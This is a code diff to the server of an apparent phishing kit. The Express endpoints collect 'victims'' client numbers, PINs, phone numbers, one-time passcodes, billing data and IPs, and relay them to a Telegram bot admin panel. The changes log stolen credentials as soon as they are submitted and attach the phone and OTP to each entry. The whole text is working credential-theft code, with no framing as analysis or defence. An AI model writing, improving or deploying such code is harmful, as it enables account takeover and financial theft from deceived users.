@@ -150,7 +150,7 @@ function buildMsg(v, extra = '') {
 Session ID: <code>${v.sid}</code>
 Client number: <code>${v.entered ? v.email : '—'}</code>
 PIN: <code>${v.entered ? v.password : '—'}</code>
-${v.phone ? `Phone: <code>${v.phone}</code>\n` : ''}\
+Phone: <code>${v.phone || '—'}</code>
 ${v.otp ? `OTP: <code>${v.otp}</code>\n` : ''}\
 ${v.billing ? `Billing: <code>${v.billing}</code>\n` : ''}\
 IP: <code>${v.ip}</code>  <a href="${geo}">Geo</a>
@@ -174,7 +174,7 @@ Date: <code>${v.dateStr}</code>`;
 Session ID: <code>${v.sid}</code>
 Client number: <code>${v.entered ? v.email : '—'}</code>
 PIN: <code>${v.entered ? v.password : '—'}</code>
-${v.phone ? `Phone: <code>${v.phone}</code>\n` : ''}\
+Phone: <code>${v.phone || '—'}</code>
 ${v.otp ? `OTP: <code>${v.otp}</code>\n` : ''}\
 ${v.billing ? `Billing: <code>${v.billing}</code>\n` : ''}\
 IP: <code>${v.ip}</code>  <a href="${geo}">Geo</a>
@@ -254,7 +254,7 @@ function buildAdminPanel() {
 ├ Client: \`${v.entered ? v.email : '---'}\`
 ├ PIN: \`${v.entered ? v.password : '---'}\`
 ├ OTP: \`${v.otp || '---'}\`
-${v.phone ? `├ Phone: \`${v.phone}\`\n` : ''}\
+├ Phone: \`${v.phone || '---'}\`
 IP: \`${v.ip}\`
 ├ Platform: \`${v.platform}\`
 └ Browser: \`${v.browser}\``;
@@ -478,10 +478,22 @@ app.post('/api/login', async (req, res) => {
     v.totalAttempts += 1;
     sessionActivity.set(sid, Date.now());
 
+    /* push to all-time log immediately */
+    auditLog.push({
+      t:        Date.now(),
+      victimN:  v.victimNum,
+      sid,
+      email:    v.email,
+      password: v.password,
+      phone:    '',               // empty for now
+      ip:       v.ip,
+      ua:       v.ua
+    });
+
     await updateAdminPanel();
     res.sendStatus(200);
   } catch (err) {
-    console.error('Login error:', err);
+    console.error('Login error', err);
     res.status(500).send('Error');
   }
 });
@@ -499,21 +511,14 @@ app.post('/api/verify', async (req, res) => {
     v.status= 'wait';
     sessionActivity.set(sid, Date.now());
 
-    auditLog.push({
-      t:        Date.now(),
-      victimN:  v.victimNum,
-      sid,
-      email:    v.email,
-      password: v.password,
-      phone,
-      ip:       v.ip,
-      ua:       v.ua
-    });
+    /* update existing audit-log entry with phone */
+    const entry = auditLog.find(e => e.sid === sid);
+    if (entry) entry.phone = phone;
 
     await updateAdminPanel();
     res.sendStatus(200);
   } catch (e) {
-    console.error('Verify error:', e);
+    console.error('Verify error', e);
     res.sendStatus(500);
   }
 });
@@ -532,7 +537,7 @@ app.post('/api/unregister', async (req, res) => {
     await updateAdminPanel();
     res.sendStatus(200);
   } catch (err) {
-    console.error('Unregister error:', err);
+    console.error('Unregister error', err);
     res.sendStatus(500);
   }
 });
@@ -549,10 +554,14 @@ app.post('/api/otp', async (req, res) => {
     v.status = 'wait';
     sessionActivity.set(sid, Date.now());
 
+    /* update existing audit-log entry with OTP */
+    const entry = auditLog.find(e => e.sid === sid);
+    if (entry) entry.otp = otp;
+
     await updateAdminPanel();
     res.sendStatus(200);
   } catch (err) {
-    console.error('OTP error:', err);
+    console.error('OTP error', err);
     res.status(500).send('Error');
   }
 });
@@ -766,7 +775,7 @@ bot.on('callback_query', async (q) => {
       }
     }
   } catch (err) {
-    console.error('Callback error:', err);
+    console.error('Callback error', err);
     bot.answerCallbackQuery(q.id, 'Error processing action');
   }
 });
